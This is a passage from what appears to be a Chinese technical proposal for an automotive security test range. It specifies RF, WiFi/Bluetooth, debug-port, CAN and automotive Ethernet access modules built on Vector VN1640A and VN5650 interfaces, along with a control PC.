发送机：发送机接收数字处理单元输出的模拟信号，并进行射频信号的放大、滤波和混频等处理。它将模拟信号转换为射频信号，并通过天线发送出去。</p><p>射频和无线电接入模块的应用广泛，包括无线通信系统（如移动通信、卫星通信）、无线数据传输（如Wi-Fi、蓝牙）和无线控制系统（如遥控器、无线传感器网络）等。它们在不同的频段和协议下工作，可以实现远距离通信、高速数据传输和多设备之间的无线连接。</p><p>R4000射频及无线接入模块能够接入315HMz、433MHz、868MHz、915MHz等频段的车辆常用高频段信号，具备车辆常用高频段信号的嗅探、录制、重放功能，具备汽车钥匙125K低频信号的中继功能。</p><p>射频及无线接入模块确保设备与台架的匹配：不同的台架或车型测试环境可能有不同的射频和无线接入需求。提高设备安全性：通过绑定使用权限，可以限制设备的使用范围，减少未经授权的访问和操控。简化设备管理：通过绑定使用权限功能，可以将设备与台架或车型测试环境进行关联，使得设备管理更加简便。</p><h4 id="蓝牙-WiFi接入模块"><a href="#蓝牙-WiFi接入模块" class="headerlink" title="蓝牙/WiFi接入模块"></a>蓝牙/WiFi接入模块</h4><h5 id="功能实施方案-20"><a href="#功能实施方案-20" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>该设备支持2.4GHz和5GHz双频段操作，确保了与各种设备的兼容性，并且可以根据环境干扰和网络拥塞情况选择最佳频段。同时，它遵循IEEE 802.11a/b/g/n/ac标准，覆盖了从早期的802.11a到最新的802.11ac的无线协议，允许设备以最大的灵活性和最高的速率进行通信；</li><li>每套接入模块支持多达8个适配器的连接。这一特性使得该模块极其适合于需要多设备并行工作的环境；</li><li>每个单元都配置了一根5db增益的全向天线，这种设计使得信号能够均匀地分布到周围环境中，无论用户设备处于何种位置，都能够接收到强劲稳定的信号。此外，模块还采用了3×3 MU-MIMO（多用户多输入多输出）的技术架构，保证接入信号质量；</li><li>该模块支持AP模式和STA模式，可以针对WiFi网络的不同模式需求进行测试，以确保更加全面的完成WiFi信息安全的各项测试内容。截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8ee0e43898d913146157d3256c79c747.png"></p><ol><li>与配套台架的绑定使用权限机制。这一机制确保在靶场系统启用之前，模块在初始化配置阶段就能够通过严格的权限控制进行配置管理。这样的设计允许系统管理员在靶场系统开始运作之前，对设备进行必要的设置和授权，确保只有经过授权的用户才能够配置和使用该模块。当靶场正式投入使用后，模块将能够在特定的台架或车型测试环境中根据授权进行配置和使用。这不仅提高了测试环境的安全性，也增强了操作的灵活性；</li></ol><p>蓝牙模块：</p><ol><li>支持低功率蓝牙（Bluetooth Low Energy, BLE）协议，以及标准蓝牙（Bluetooth Classic）协议。通过这种双协议支持，模块不仅能够为需要持续连接、低延迟的设备提供稳定的通信服务，例如音频设备和某些高性能传感器，还能够为那些对能耗有严格要求的应用提供解决方案，比如可穿戴设备和智能家居设备。</li><li>每套接入模块支持多达8个适配器的连接。这一特性使得该模块极其适合于需要多设备并行工作的环境；</li><li>每个单元都配置了一根5db增益的全向天线，这种设计使得信号能够均匀地分布到周围环境中，无论用户设备处于何种位置，都能够接收到强劲稳定的信号。此外，模块还采用了3×3 MU-MIMO（多用户多输入多输出）的技术架构，保证接入信号质量；</li><li>与配套台架的绑定使用权限机制。这一机制确保在靶场系统启用之前，模块在初始化配置阶段就能够通过严格的权限控制进行配置管理。这样的设计允许系统管理员在靶场系统开始运作之前，对设备进行必要的设置和授权，确保只有经过授权的用户才能够配置和使用该模块。当靶场正式投入使用后，模块将能够在特定的台架或车型测试环境中根据授权进行配置和使用。这不仅提高了测试环境的安全性，也增强了操作的灵活性；</li><li>内置上位机，该上位机配备了Intel第10代4核心i5处理器，确保了模块的处理能力可以轻松应对各种复杂的数据处理任务。此外，上位机搭载了8GB的内存，提供了充足的运行空间，以便于同时执行多个操作，包括信号解码、数据分析和复杂算法的运算，而不会出现延迟或卡顿的问题。至于存储方面，模块内置了250GB的固态硬盘（SSD），这不仅提供了快速的数据读写速度，确保了数据处理的高效性，而且提供了足够的存储空间，用于存储大量的信号录制文件和日志数据。</li></ol><h5 id="技术实现内容-18"><a href="#技术实现内容-18" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-7"><a href="#方案-7" class="headerlink" title="方案"></a>方案</h6><p>蓝牙接入模块是一种用于实现蓝牙无线通信的设备。蓝牙技术是一种短距离无线通信技术，它可以在数米到几十米的范围内实现设备之间的无线通信和数据传输。蓝牙接入模块通常包括蓝牙收发器、天线和相关的电路和接口。</p><p>蓝牙接入模块的主要功能是接收和发送蓝牙信号，实现设备之间的无线通信。它通常包括以下组件：</p><p>1. 蓝牙收发器：蓝牙收发器是蓝牙接入模块的核心部分，它负责处理蓝牙信号的调制、解调和编码等操作。蓝牙收发器可以支持不同的蓝牙版本和协议，如蓝牙2.0、蓝牙4.0、蓝牙5.0等。</p><p>2. 天线：天线用于接收和发送蓝牙信号。天线的设计和性能对蓝牙通信的范围和质量有着重要影响。</p><p>3. 电路和接口：蓝牙接入模块通常包括与其他设备连接的电路和接口，如UART、SPI、I2C等。这些接口用于与主控设备（如微处理器、单片机）进行通信，实现数据的传输和控制。</p><p>WiFi接入模块是一种用于实现无线局域网（Wireless Local Area Network，简称WiFi）连接的设备。WiFi技术基于IEEE 802.11标准，可以在较大范围内实现设备之间的无线通信和数据传输。WiFi接入模块通常包括WiFi收发器、天线和相关的电路和接口。</p><p>WiFi接入模块的主要功能是接收和发送WiFi信号，实现设备之间的无线局域网连接。它通常包括以下组件：</p><p>WiFi收发器：WiFi收发器是WiFi接入模块的核心部分，负责处理WiFi信号的调制、解调和编码等操作。WiFi收发器可以支持不同的WiFi标准和频段，如802.11b/g/n/ac/ax等。</p><p>天线：天线用于接收和发送WiFi信号。天线的设计和性能对WiFi通信的范围和质量有着重要影响。</p><p>电路和接口：WiFi接入模块通常包括与其他设备连接的电路和接口，如UART、SPI、I2C等。这些接口用于与主控设备（如微处理器、单片机）进行通信，实现数据的传输和控制。</p><p>提供的WiFi模具备8个适配器，配备一根5db全向天线，保证接入信号质量，支持2.4G和5G双频，支持802.11a/b/g/n/ac协议。同时拥有AP模式和STA模式。</p><p>WIFI接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><p>提供的蓝牙接入模块具备8个适配器，配备一根5db全向天线，保证接入信号质量，支持低功率蓝牙和标准蓝牙协议。</p><p>蓝牙接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><h4 id="调试口接入模块"><a href="#调试口接入模块" class="headerlink" title="调试口接入模块"></a>调试口接入模块</h4><h5 id="功能实施方案-21"><a href="#功能实施方案-21" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>具备了对现有及新加入的测试台架上的USB、网口调试接口接入及组网的完全支持。这种支持不仅包括了物理接口的接入，还包括了通过这些接口实现的设备之间的高效组网能力；</li><li>支持对于Android Debug Bridge (ADB) 和 Secure Shell (SSH) 协议，这两种协议的支持极大地拓宽了模块的应用范围；</li><li>与配套台架的绑定使用权限机制。这一机制确保在靶场系统启用之前，模块在初始化配置阶段就能够通过严格的权限控制进行配置管理。这样的设计允许系统管理员在靶场系统开始运作之前，对设备进行必要的设置和授权，确保只有经过授权的用户才能够配置和使用该模块。当靶场正式投入使用后，模块将能够在特定的台架或车型测试环境中根据授权进行配置和使用。这不仅提高了测试环境的安全性，也增强了操作的灵活性；</li><li>内置上位机，该上位机配备了Intel第10代4核心i5处理器，确保了模块的处理能力可以轻松应对各种复杂的数据处理任务。此外，上位机搭载了8GB的内存，提供了充足的运行空间，以便于同时执行多个操作，包括信号解码、数据分析和复杂算法的运算，而不会出现延迟或卡顿的问题。至于存储方面，模块内置了250GB的固态硬盘（SSD），这不仅提供了快速的数据读写速度，确保了数据处理的高效性，而且提供了足够的存储空间，用于存储大量的信号录制文件和日志数据。</li></ol><h5 id="性能实施方案-6"><a href="#性能实施方案-6" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li>支持多达6路USB接口和6路以太网调试接口的接入，从而为用户提供了极大的灵活性和扩展性。这意味着用户可以同时连接多达6个USB设备，以及6个以太网设备，实现多设备的并行调试和数据通信。</li></ol><h5 id="技术实现内容-19"><a href="#技术实现内容-19" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-8"><a href="#方案-8" class="headerlink" title="方案"></a>方案</h6><p>调试口接入模块是一种用于连接和调试目标设备的接口模块。它通常用于开发和调试过程中，以便与目标设备进行通信、调试和数据传输。</p><p>调试口接入模块的主要功能是提供一个可编程的接口，使开发人员能够与目标设备进行通信和控制。它通常包括以下组件：</p><p>1. 接口类型：调试口接入模块可以支持多种接口类型，如串口（UART）、以太网口、USB接口等。具体选择取决于目标设备的接口类型和开发人员的需求。</p><p>2. 电路和接口：调试口接入模块通常包括与目标设备连接的电路和接口，如引脚、插座等。这些接口用于与目标设备进行物理连接，以实现数据传输和调试功能。</p><p>3. 控制芯片：调试口接入模块可能会包含一个控制芯片，用于管理和控制与目标设备之间的通信。控制芯片可以提供额外的功能，如信号转换、电平转换、数据缓存等。</p><p>调试口接入模块的设计和功能取决于目标设备的特性和开发人员的需求。它可以用于各种场景，如嵌入式系统开发、单片机调试、硬件调试等。通过调试口接入模块，开发人员可以与目标设备进行通信、调试和数据传输，以便进行软件调试、固件烧录、性能分析等操作。</p><p>调试口接入模块支持现有、新增台架上的USB、网口调试接口接入及组网。调试口接入模块的程控与测试软件支持ADB、SSH协议。</p><p>设备支持6路USB、6路以太网调试接口接入</p><p>调试口接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><h4 id="车载网络接入模块"><a href="#车载网络接入模块" class="headerlink" title="车载网络接入模块"></a>车载网络接入模块</h4><h5 id="车载网络测试软件"><a href="#车载网络测试软件" class="headerlink" title="车载网络测试软件"></a>车载网络测试软件</h5><h6 id="功能实施方案-22"><a href="#功能实施方案-22" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>为客户提供5套车载网络测试软件的永久使用许可证（license），这些许可证支持了车载网络中最为关键的两种通信协议：CAN（Controller Area Network）和ETH（Ethernet）；</li><li>车载网络测试软件内置了多种先进的通信数据库编辑器，以满足不同类型的数据编辑和管理需求。例如，软件包含了CANdb++编辑器，它专为DBC数据编辑库设计，使用户能够轻松创建、修改和管理DBC文件，这对于在车载网络中定义和解析CAN总线上的消息至关重要。此外，提供Communication Model Editor，这是一个支持SOA（Service-Oriented Architecture）数据模型编辑的工具，它允许用户设计和实现基于服务的车载通信架构；</li><li>通过建模进行完整的总线系统仿真和残余总线仿真，允许用户进行完整的总线系统仿真，从而验证和测试车辆通信网络的性能和功能。这种仿真不仅覆盖了正常操作情况下的网络行为，还能模拟在各种异常或边缘情况下的网络，确保系统在真实世界的复杂环境中的鲁棒性；</li><li>具备强大的总线通信分析功能，可以对总线通信进行深入的监测和诊断；</li><li>能够对完整的车载网络系统进行全面的测试，确保整个系统的通信协议和数据流在各种工作状态下都能正常运行，而且还能够针对单个控制单元进行细致的测试；</li><li>通过统一诊断服务（UDS）协议，它能够执行详尽的诊断通信测试。这一功能对于检测和评估车辆内部通信网络至关重要，尤其是在诊断故障码、监控车辆状态、编程车辆控制单元等方面；</li><li>允许用户根据自己的特定需求创建个性化的界面，这种定制能力用户可以设计界面来精确控制仿真和测试过程，或者配置特定的数据视图以直观地展现分析结果。无论是需要快速访问特定的测试命令，还是希望在一目了然的仪表板上监控实时数据，软件的灵活界面都能够满足这些需求；</li><li>车载网络测试软件模块为用户提供了下面的窗口和模块，以方便用更加直观的利用各个模块：；</li><li>具备先进的图形显示功能，允许用户以直观的方式查看网络行为和测试结果。支持的功能模块为用户提供了一系列强大的工具，可以对车载网络进行深入的分析和评估。软件中的评估功能的参数化测量设置进一步增强了这些工具的实用性，使得用户可以根据具体的测试需求来配置和调整测量参数；</li><li>支持详尽列出网络上的所有活动，包括每一条报文、错误帧和远程帧。这一功能使得用户能够获得网络通信的全景视图，从而有效地追踪和分析网络中的每一个事件。对于报文，软件不仅能够展示整体信息，还允许用户查看到每条报文中的独立信号，这增加了分析的精细度。此外，强大的过滤功能使得用户可以根据需要快速定位到特定的报文或信号，从而提高了测试和故障诊断的效率。软件中的事件显示功能进一步扩展了监控能力，用户可以查看到错误事件、系统变量、传输协议信息以及诊断服务等重要信息；</li><li>支持将信号、变量和诊断参数转换为XY图形的形式展现，提供了一个非常直观的方式来分析数据。用户可以通过这些图形工具来测量和观察不同变量之间的关系，例如，速度和温度随时间的变化曲线。这种图形化展示不仅仅局限于简单的数据对比，还可以用于复杂的趋势分析和模式识别，帮助用户识别和预测系统的行为；</li><li>支持以传统的数字形式展示信号值，这对于需要精确读数的应用场景来说至关重要。数字显示提供了直接的数值信息，让用户能够快速准确地把握当前信号的状态。为了更直观地理解信号值的变化和趋势，软件还提供了柱状图形式的显示，通过这种方式，用户可以一目了然地看到信号值随时间或其他变量变化的动态图形。</li><li>提供了全面的监控功能，允许用户实时跟踪报文频率，快速识别网络中的错误帧，监控总线负载以评估网络流量状况，以及检查控制器状态以确保系统运行正常。这些功能集中体现了软件的能力，旨在帮助用户维护网络的稳定性和效率，同时快速定位和解决潜在的通信问题。简洁的界面和强大的后台分析工具相结合，使得该软件成为车载网络管理和故障诊断的理想选择。</li><li>提供了高级的报文触发机制，实时地发送修正信号，确保测试的准确性和及时性。这样的实时信号发送功能不仅提高了测试过程的灵活性，也使得用户能够在复杂的车载网络环境中进行精确的故障诊断和系统验证。</li><li>车载网络测试软件配备了高效的数据记录能力，允许实时捕获通信数据，并保存供后期分析，这对于故障追踪和性能优化至关重要。它还支持数据回放，让用户能够在仿真环境中重现实际情况，有助于测试网络的应对能力，并在开发阶段帮助分析和解决问题。</li><li>支持针对总线事件的具体，优化了显示和记录功能，减少显示和记录的数据的数量。这种智能筛选机制使得用户能够集中关注关键事件，提高了测试效率，同时减轻了系统负载。</li><li>车载网络测试软件提供了强大的显示系统，支持展现系统报文及用户自定义的输出内容。这一功能不仅让用户能够直接查看和分析标准通信报文，还能够根据个性化的测试需求定制并显示特定信息，从而在网络监控和故障排查时提供了更加灵活和细致的数据视图。</li></ol><h6 id="技术实现内容-20"><a href="#技术实现内容-20" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>CAN总线测试系统是一款广泛应用于汽车行业的开发和测试工具，用于开发、仿真和测试汽车电子系统。它提供了丰富的功能和灵活的配置选项，以支持各种汽车网络和通信协议的开发和测试。可实现以下功能：</p><p>1. 汽车网络仿真：CAN总线测试系统支持多种汽车网络协议，如CAN（Controller Area Network）、LIN（Local Interconnect Network）、FlexRay、Ethernet等。它可以模拟这些网络，并生成相应的通信消息，以便对车辆电子系统进行测试和验证。</p><p>2. 通信与诊断：CAN总线测试系统提供了丰富的通信和诊断功能，可以与车辆的ECU（Electronic Control Unit）进行通信，并监视和记录通信消息。它支持诊断协议，如UDS（Unified Diagnostic Services）、KWP2000（Keyword Protocol 2000）等，用于诊断车辆系统和读取传感器数据。</p><p>3. 信号和消息编辑：CAN总线测试系统允许用户创建和编辑信号和消息，以模拟车辆系统的输入和输出。用户可以定义信号的值、周期和触发条件，以生成各种测试场景和数据。</p><p>4. 功能和性能测试：CAN总线测试系统提供了测试框架和功能，用于执行功能和性能测试。用户可以创建测试用例、定义测试参数和期望结果，并自动执行测试过程。CANoe还提供了丰富的分析和报告功能，用于评估测试结果和生成测试报告。</p><p>5. 仿真和模型集成：CAN总线测试系统可以与其他仿真和建模工具集成，如MATLAB/Simulink、dSPACE等。这使得开发人员可以在CANoe中使用仿真模型，并与实际车辆系统进行集成和测试。</p><p>6. 通信总线监测：CAN总线测试系统可以监测汽车网络上的通信活动，并提供实时的网络状态和消息跟踪。这对于故障排除和网络性能分析非常有用。</p><h5 id="CAN总线接入模块"><a href="#CAN总线接入模块" class="headerlink" title="CAN总线接入模块"></a>CAN总线接入模块</h5><h6 id="功能实施方案-23"><a href="#功能实施方案-23" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>支持用户自定义CAN和CAN-FD的波特率以及采样点设置。无论是传统的CAN网络还是新一代的CAN-FD系统，用户都能够根据具体的网络要求和性能指标，灵活选择合适的通信速率和数据采集时机；</li><li>能够处理CAN和CAN FD总线上的数据，实现高效的数据接收和发送。这个模块不仅能够无缝地接入现有的车载网络，捕捉和传递网络上的数据流，还能够向网络发送指令或数据，支持复杂的交互和控制任务；</li><li>支持VN1640A单台具备4路CAN/CANFD通道，提供15套即15*4路共60路的高速CAN/CAN FD通道，充分满足了多通道数据处理的需求。对于CAN通道，模块能够支持多种波特率设置，包括125kbps、250kbps、500kbps以及1Mbps，确保了与各种不同速率要求的车载网络的兼容性。而对于CAN FD通道，模块同样支持多样的波特率选择，用户可以根据需要选择2Mbps、5Mbps或是8Mbps的传输速率。这种灵活的波特率配置能力，使得该模块能够适应从传统车载网络到最新高速网络的各种应用场景，无论是在车辆监控、数据采集还是网络测试中，都能提供稳定可靠的数据传输性能；</li><li>对所有发送和接收的信号进行精确的时间戳记录。这一功能至关重要，因为它允许用户跟踪每个信号的具体发送和接收时间，从而实现对数据流的细致分析和时间同步；</li><li>该模块每路都具备强大的监测功能，能够有效地检测网络上的错误帧和远程帧；</li><li>为了实现最高效的车辆网络通信，不会出现丢帧或传输延迟的问题，所有CAN/CANFD通道均能在100%的总线负载下正常运作；</li><li>配备了高级的硬件同步接口，具备高达1微秒的同步精度，这样的设计使得模块可以无缝地与其他总线接口卡协同工作。这一特性对于需要精确时间对齐的应用场景来说至关重要，确保了数据交换过程中的高度同步性，从而在复杂的多总线系统中实现了数据的实时准确传输；</li><li>支持利用各种网络测试工具来监控、分析和调试CAN网络。</li></ol><h6 id="技术实现内容-21"><a href="#技术实现内容-21" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>CAN总线接入模块介绍</p><p>CAN总线接入模块是一种用于连接和控制CAN（Controller Area Network）总线的接口模块。CAN总线是一种广泛应用于汽车和工业领域的串行通信协议，用于在不同的电子控制单元（ECU）之间传输数据和命令。</p><p>CAN总线接入模块通常具有以下功能和特点：</p><p>1. CAN总线连接：CAN总线接入模块提供了物理接口，用于连接到CAN总线。它可以与CAN总线上的其他设备进行通信，并传输和接收CAN消息。</p><p>2. 数据传输和接收：CAN总线接入模块可以发送和接收CAN消息。它可以将数据封装成CAN消息并发送到总线上，同时也可以监听总线上的消息，并将其解析成可读的数据。</p><p>3. 消息过滤和筛选：CAN总线接入模块通常支持消息过滤和筛选功能。它可以根据消息的标识符（ID）或其他属性，选择性地接收和处理特定的CAN消息。</p><p>4. 速率和波特率控制：CAN总线接入模块可以控制CAN总线的速率和波特率。它可以根据需要调整通信速率，以适应不同的应用场景和网络要求。</p><p>5. 硬件和软件集成：CAN总线接入模块通常具有与其他硬件和软件系统的集成能力。它可以与ECU、计算机、测试设备等进行连接，并与其他系统进行数据交换和通信。</p><p>6. 数据分析和诊断：一些CAN总线接入模块提供了数据分析和诊断功能。它们可以监视CAN总线上的通信活动，记录和分析CAN消息，并帮助用户进行故障排除和系统调试。</p><p>CAN总线接入模块在汽车和工业领域中广泛应用于开发、测试和诊断CAN总线系统。它们为工程师和技术人员提供了一种便捷的方式来连接和控制CAN总线，并实现数据传输、消息监控和系统分析。</p><p>CAN总线接入模块配置方案</p><p>Vector公司的产品和解决方案涵盖了汽车电子领域的多个关键领域，包括汽车网络通信、汽车诊断、ECU开发、测试工具和嵌入式系统集成等。</p><p>在汽车网络通信方面，Vector公司提供了一系列的网络通信产品和解决方案，包括CAN/CANFD、LIN、FlexRay、Ethernet等。这些产品和解决方案使得车辆内部的电子控制单元（ECU）能够高效地进行通信和数据交换，实现车辆各个系统的协调工作。</p><p>VN1640A是Vector公司推出的一款汽车网络接口产品，它是一款多通道的汽车网络接口，提供了高速的数据传输能力，支持波特率125kbps、250kbps，500kbps，1Mbps，CAN-FD支持波特率2Mbps、5Mbps、8Mbps，主要用于开发、测试和分析汽车电子系统中的网络通信。其主要特点是其支持多种汽车网络通信协议，包括CAN、LIN，该产品具有4个独立物理通道，每个通道都可以独立配置为CAN/CANFD/LIN接口。产品图片如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8c6c12d8cf4e84e401e5aaf2167d6349.png"></p><p>为满足CAN总线接入模块的60路高速CAN/CANFD通道的需求，提供15套VN1640A，合计15*4即60路高速CAN/CANFD通道，以确保的日常使用需求。</p><h5 id="车载以太网接入模块"><a href="#车载以太网接入模块" class="headerlink" title="车载以太网接入模块"></a>车载以太网接入模块</h5><h6 id="功能实施方案-24"><a href="#功能实施方案-24" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>提供的VN5650具备12通道的标准100BASE-T1/1000BASE-T1（OPEN Alliance BroadR-Reach）接口，共提供30套VN5650，即30*12共计360通道的100BASE-T1/1000BASE-T1（OPENAllianceBroadR-Reach）接口，这一特性使得模块能够处理大量的数据传输，同时保持与OPEN Alliance BroadR-Reach技术的完全兼容性；</li><li>提供的VN5650具备2通道的标准10BASE-T、100BASE-TX和1000BASE-T接口，共提供30套VN5650，即30*2共计60通道的标准以太网连接，包括10BASE-T、100BASE-TX和1000BASE-T规格。这种强大的多通道支持使得模块能够适应各种数据密集型应用，从基本的车辆诊断到高端的多媒体传输；</li><li>提供的VN5650具备2通道的CAN/CAN FD通道，共提供30套VN5650，即30*2共60个独立的CAN/CAN FD通道，这些通道通过1个标准的D-SUB 9接口提供连接。这一设计使得模块能够同时处理多个CAN或CAN FD总线上的数据交换，满足复杂车辆系统中对于多通道、高效率通信的需求。每个通道都能独立运作，确保了数据传输的准确性和系统的可靠性；</li><li>支持IO接口，这些接口可以用于设置或采样各种模拟或数字值。此功能极大地增强了模块的适用范围，使其能够与车辆中的传感器或执行器直接交互，实现数据的即时读取和控制信号的有效输出；</li><li>提供了通过USB 3.0接口与主机的高速连接功能，这一特性使得模块能够利用USB 3.0的高带宽优势，确保数据传输的高速性和稳定性；</li><li>配备了能够为每个以太网帧提供高分辨率时间戳的功能，这一特性极大地提高了网络数据分析和故障诊断的精确度。高分辨率时间戳允许系统以极高的时间精度记录每一帧的发送或接收时刻，从而为网络性能的评估和时间敏感的应用提供了强有力的支持；</li><li>提供了对CAN/CANFD帧的高分辨率时间戳功能，这一特性允许系统以极高的时间精度记录每个数据帧的发送和接收时刻。这种高分辨率的时间标记对于诊断通信问题、性能分析以及系统同步至关重要，尤其是在需要精确时间对准的复杂车载网络系统中；</li><li>多个网络接口的软件和硬件时间同步机制，确保了在车辆的多个网络系统之间实现精确的时间对齐。这种同步技术对于确保网络数据的一致性和时序的准确性至关重要，特别是在安全性和协调性要求极高的车载网络操作中；</li><li>具备了内部三向路由功能，in：输入；monitor:监控；out：输出，使得模块能够灵活地处理网络数据流；</li><li>对以太网和CAN数据流进行硬件级别的过滤。这种硬件过滤功能允许模块在数据进入处理层之前，即在硬件层面上对传入的数据包进行筛选，有效地减轻了主处理器的负担；</li><li>内置了集成的Layer2交换机，这是一个专门为优化多通道数据流而设计的特性，它在处理残余总线仿真时发挥着至关重要的作用。通过这个集成的Layer2交换机，模块可以更高效地管理和分配来自不同通道的数据流，确保数据包在多个通道之间顺畅地传输，减少数据拥堵和交叉干扰；</li><li>精密的硬件负载发生器，该发生器专为用于低抖动和支持全带宽的流量而设计。这一功能对于模拟真实世界中的网络条件至关重要，它确保在进行数据传输和处理时，能够模拟出接近真实车辆网络环境下的数据流；</li><li>具备高度独立的工作模式，这一功能设计用于确保模块即便在最为苛刻的环境条件下也能够持续稳定地运行；</li><li>适用于汽车和工业应用的稳定性，无论是在低电压的紧急供电情况还是在高电压的峰值负载中，模块都能保持稳定性能，确保关键功能的持续运作。同时，它的温度适应范围广，能够应对从极寒到极热的环境变化，无论是置于高温的工业环境还是在寒冷的户外条件下，都能保证设备的正常运行和通信的可靠性；</li><li>支持广泛的第三方工具链，这一特性极大地增强了其灵活性和适用性。模块的接口设计允许使用标准的XL驱动程序库，这包括了对于CAN总线和以太网通信的支持；</li><li>支持网络测试工具软件，支持综合的网络诊断和性能评估。</li></ol><h6 id="技术实现内容-22"><a href="#技术实现内容-22" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>车载以太网接入模块介绍</p><p>车载以太网接入工具是一种用于在汽车中实现以太网连接的设备或工具。以太网是一种常用的局域网通信协议，它提供高速、可靠的数据传输能力，广泛应用于计算机网络中。在车辆领域，车载以太网接入工具允许车辆和乘客通过无线网络访问互联网，享受各种在线服务和功能。</p><p>以下是对车载以太网接入工具的描述：</p><p>1. 网络连接：车载以太网接入工具提供了连接到车辆以太网的能力。它可以通过有线或无线方式与车辆的以太网网络进行连接，实现车辆与外部网络的通信。</p><p>2. 高速数据传输：车载以太网接入工具支持高速数据传输，可以提供较高的带宽和传输速度。这使得车辆和乘客可以快速地访问互联网，享受流畅的在线娱乐、导航和通信体验。</p><p>3. 多设备连接：车载以太网接入工具通常支持多设备连接。它可以同时连接多个设备，如智能手机、平板电脑、车载娱乐系统等，使多个用户可以同时访问互联网。</p><p>4. 安全性和隐私保护：车载以太网接入工具通常具有安全性和隐私保护功能。它可以支持加密通信和身份验证，确保数据传输的安全性。同时，它也可以提供隐私保护措施，防止未经授权的访问和信息泄露。</p><p>5. 车载应用和服务：车载以太网接入工具可以为车辆提供各种车载应用和服务。它可以连接到车辆的娱乐系统、导航系统、车载诊断系统等，实现在线地图更新、远程诊断、软件升级等功能。</p><p>6. 数据采集和分析：车载以太网接入工具还可以用于数据采集和分析。它可以收集车辆的运行数据、传感器数据等，并将其上传到云端或其他远程服务器进行分析和处理。</p><p>车载以太网接入工具是一种使车辆能够连接到互联网的设备或工具。它提供了高速数据传输、多设备连接、安全性和隐私保护等功能，为车辆和乘客提供了丰富的在线服务和功能。车载以太网接入工具在现代车辆中越来越普遍，为车辆的互联网连接和智能化提供了重要的支持。</p><p>车载以太网接入模块配置方案</p><p>Vector公司的产品和解决方案涵盖了汽车电子领域的多个关键领域，包括汽车网络通信、汽车诊断、ECU开发、测试工具和嵌入式系统集成等。</p><p>在汽车网络通信方面，Vector公司提供了一系列的网络通信产品和解决方案，包括CAN/CANFD、LIN、FlexRay、Ethernet等。这些产品和解决方案使得车辆内部的电子控制单元（ECU）能够高效地进行通信和数据交换，实现车辆各个系统的协调工作。</p><p>VN5650是Vector公司推出的一款汽车以太网网络接口产品，主要作为车载以太网相关通信的接口卡，主要的网络接口有12路100BASE-T1/1000BASE-T1接口，2路CAN/CANFD接口，2路10BASE-T/100BASE-TX/1000BASE-T接口。产品图片如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/97c3776e39276808f4f417dc6564798e.png"></p><p>为满足的30通道的100BASE-T1/1000BASE-T1，60通道的标准以太网，10个独立的CAN/CANFD通道。提供30套VN5650，即提供12*30共360通道的100BASE-T1/1000BASE-T1，2*30共60通道的标准以太网接口，2*30共60通道的CAN/CANFD。完全满足的日常使用需求。</p><p>针对CAN总线接入模块和车载以太网模块，具体落地实施前，就相关的通道硬件分配方案与沟通评审，在取得同意后进行实施，以保证相关任务的执行。</p><h4 id="程控上位机-1"><a href="#程控上位机-1" class="headerlink" title="程控上位机"></a>程控上位机</h4><h5 id="功能实施方案-25"><a href="#功能实施方案-25" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>主流工业母版，支持了新一代的Intel LGA 1700插槽。这种支持使得模块能够与基于最新Intel处理器的高性能工业计算平台无缝集成，从而充分利用这些处理器强大的计算能力和高效的数据处理性能；</li><li>精选中央处理单元（CPU），采用了Intel的第13代i7处理器，确保了模块具有强大的数据处理能力和快速的运算速度。这种高标准的处理器选择为车载网络的稳定运行提供了坚实的硬件保障，使得模块能够轻松应对大量数据传输和复杂的网络任务；</li><li>具备3个PCIe（Peripheral Component Interconnect Express）插槽，这使得模块具有高度的扩展性和灵活性；</li><li>模块配备了5个USB接口，这一设计大幅提升了其外设连接能力和模块的实用性；</li><li>拥有2个千兆网口，这一特性极大地增强了模块在数据传输速度和网络连接稳定性方面的性能；</li><li>装备了RS232和RS485串口，这两种串行通信接口极大地丰富了模块与传统工业设备的兼容性和通信能力；</li><li>配置了32G DDR4内存，这一大容量的高速内存使得模块拥有强大的数据处理能力和快速的速度；</li><li>搭载了1T 